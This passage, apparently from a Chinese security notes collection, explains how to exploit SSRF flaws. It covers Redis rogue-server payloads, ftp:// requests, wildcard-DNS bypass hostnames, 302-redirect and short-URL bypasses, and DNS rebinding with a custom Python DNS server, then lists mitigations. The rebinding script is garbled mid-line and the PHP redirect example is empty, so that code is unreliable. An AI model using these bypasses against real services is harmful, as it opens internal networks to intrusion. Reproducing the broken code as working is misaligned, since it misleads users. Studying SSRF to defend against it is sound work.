    port="6379"
    ......
    passwd = ''                 # 密码改成 root
```
生成 payload,记得 URL 编码一下
rogue-server 使用这个项目的 https://github.com/Dliv3/redis-rogue-server.git
```
python3 redis-rogue-server.py --server-only --lport 6666
```
访问
#### FTP
**相关文章**
- [如何用 FTP 被动模式打穿内网](https://www.anquanke.com/post/id/254387)
- [URL ECCENTRICITIES IN JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
    - [samsbp/java-file-ftp](https://github.com/samsbp/java-file-ftp)
**利用**
```
ftp://127.0.0.1:21/file
```
### DNS 与 重定向欺骗
#### wildcard DNS
开发人员在构建 SSRF 防护时，只考虑到了域名，没有考虑到域名解析后的 IP，则存在被利用域名解析服务来绕过的可能。
```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```
> http://xip.io
```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```
> http://nip.io
#### 302 跳转
当防御方限制只允许 http(s) 访问或者对请求的 host 做了正确的校验后，可以通过 30x 方式跳转进行绕过。
比如,我们可以搭建一个服务,在收到目标服务器的请求后添加一个 Location 响应头重定向至内网服务器
```php
```
#### url 短链
开发人员在进行 SSRF 防护时，未考虑到短网址的影响，则存在被利用短网址绕过的可能。
- https://a.f8x.io/
#### DNS-Rebinding
> DNS重绑定
**描述**
DNS 重绑定攻击的原理是当我们设置恶意域名 TTL 为非常小的值时，DNS 记录仅在短时间内有效,目标服务第一次解析域名后，第二次重新请求 DNS 服务器获取新的 ip，两次 DNS 解析是有时间差的，我们可以使用这个时间差进行绕过，利用服务器两次解析同一域名的短暂间隙，更换域名背后的 ip 进行 ssrf。
利用方法如下：
1. 在网站 SSRF 漏洞处访问精心构造的域名。网站第一次解析域名，获取到的 IP 地址为 A；
2. 经过网站后端服务器的检查，判定此 IP 为合法 IP。
3. 网站获取 URL 对应的资源（在一次网络请求中，先根据域名服务器获取 IP 地址，再向 IP 地址请求资源），第二次解析域名。此时已经过了 ttl 的时间，解析记录缓存 IP 被删除。第二次解析到的域名为被修改后的 IP 即为内网 IP B；
4. 攻击者访问到了内网 IP。
**注意点**
1. java 中 DNS 请求成功的话默认缓存 30s(字段为 networkaddress.cache.ttl，默认情况下没有设置)，失败的默认缓存 10s。（缓存时间在 /Library/Java/JavaVirtualMachines/jdk /Contents/Home/jre/lib/security/java.security 中配置）所以一般认为 java 不存在 DNS rebinding 问题。
2. 在 php 中则默认没有缓存。
3. Linux 默认不会进行 DNS 缓存，mac 和 windows 会缓存 (所以复现的时候不要在 mac、windows 上尝试)
4. 有些公共 DNS 服务器，比如 114.114.114.114 还是会把记录进行缓存，但是 8.8.8.8 是严格按照 DNS 协议去管理缓存的，如果设置 TTL 为 0，则不会进行缓存。
**相关文章/案例**
- [DNS Rebinding 域名重新绑定攻击技术](https://cloud.tencent.com/developer/article/1400018)
- [通过 DNS Rebinding 获取访客 QQ 号](https://0x0d.im/archives/get-visitor-qq-number-through-dns-rebinding.html)
- [Java环境下通过时间竞争实现DNS Rebinding 绕过SSRF 防御限制](https://mp.weixin.qq.com/s/dA40CUinwaitZDx6X89TKw)
- [渗透测试-DNS重绑定](https://mp.weixin.qq.com/s/Y03173LF2SN5zF1zgvx4EQ)
- [从0到1认识DNS重绑定攻击](https://xz.aliyun.com/t/7495)
- [DNS Rebinding in Browser](https://mp.weixin.qq.com/s/jiX1zC5_1y9tipYzM8Oxdg)
**相关工具**
- [makuga01/dnsFookup](https://github.com/makuga01/dnsFookup) - DNS rebinding toolkit
- [nccgroup/singularity](https://github.com/nccgroup/singularity) - A DNS rebinding attack framework.
- http://ceye.io/dns-rebinding
- [Tr3jer/dnsAutoRebinding](https://github.com/Tr3jer/dnsAutoRebinding) - ssrf、ssrfIntranetFuzz、dnsRebinding、recordEncode、dnsPoisoning、Support ipv4/ipv6
**利用方法**
Dns rebinding 常见方案除了自建 dns 服务器之外，还可以通过绑定两个 A 记录，一个绑定外网 ip，一个绑定内网 ip。这种情况访问顺序是随机的，无法保证成功率。
自建 dns 服务器需要配置将域名的 dns 服务指向自己的 vps，然后在 vps 上运行域名解析脚本，内容如下
```py
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
from twisted.internet import reactor, defer
from twisted.names import client, dns, error, server
record={}
class DynamicResolver(object):
    def _doDynamicResponse(self, query):
        name = query.name.name
        if name not in record or record[name] "+ip
        answer = dns.RRHeader(
            name=name,
            type=dns.A,
            cls=dns.IN,
            ttl=0,
            payload=dns.Record_A(address=b'%s'%ip,ttl=0)
        )
        answers = [answer]
        authority = []
        additional = []
        return answers, authority, additional
    def query(self, query, timeout=None):
        return defer.succeed(self._doDynamicResponse(query))
def main():
    factory = server.DNSServerFactory(
        clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')]
    )
    protocol = dns.DNSDatagramProtocol(controller=factory)
    reactor.listenUDP(53, protocol)
    reactor.run()
if __name__ == '__main__':
    raise SystemExit(main())
```
```bash
python2 -m pip install twisted
systemctl stop systemd-resolved
python2 test.py
```
当第一次访问时，解析为外网 ip 通过 ssrf 检测，
第二次访问时，也即业务访问时，ip 会指向 127.0.0.1，从而达到了绕过目的。
**修复方案**
在 Check 时获取 IP 地址，后面的请求绑定此 IP
#### TLS Poison
- [TLS Poison](../../协议安全/Protocol-Exploits.md#tls-poison)
---
## SSRF 修复方案
* 过滤 url 中的特殊字符
* 禁用不需要的协议，只允许 HTTP 和 HTTPS 请求，可以防止类似于 file://, gopher://, ftp:// 等引起的问题。
* 白名单的方式限制访问的目标地址，禁止对内网发起请求。
* 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
* 验证请求的文件格式,禁止跟随 301、302 跳转。
* 限制请求的端口为 http 常用的端口，比如 80、443、8080、8000 等。
* 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。